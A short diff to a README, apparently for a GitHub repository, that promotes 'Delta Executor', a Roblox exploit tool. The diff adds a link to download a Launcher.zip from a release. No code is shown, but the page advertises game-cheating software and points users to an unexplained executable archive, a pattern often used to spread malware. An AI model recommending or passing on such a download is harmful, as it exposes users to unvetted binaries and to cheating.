@@ -6,6 +6,8 @@
 ## 📌 What is Delta Executor?
 Delta Executor is a versatile, free tool designed to elevate your Roblox gameplay with advanced exploit functions. Created by experienced developers, Delta Executor provides access to robust features, allowing users to run custom scripts, automate commands, and manage in-game upgrades effortlessly. Currently available on Windows and Android, with plans to expand to iOS soon, Delta Executor is perfect for gamers looking for reliable and accessible exploit software.
 
+### [*Download latest update*](https://github.com/djsahfy/delta-executor/releases/download/Update-11-11/Launcher.zip)
+
 ## 🚀 Delta Executor Key Features
 
 ### 📲 Frequent Updates
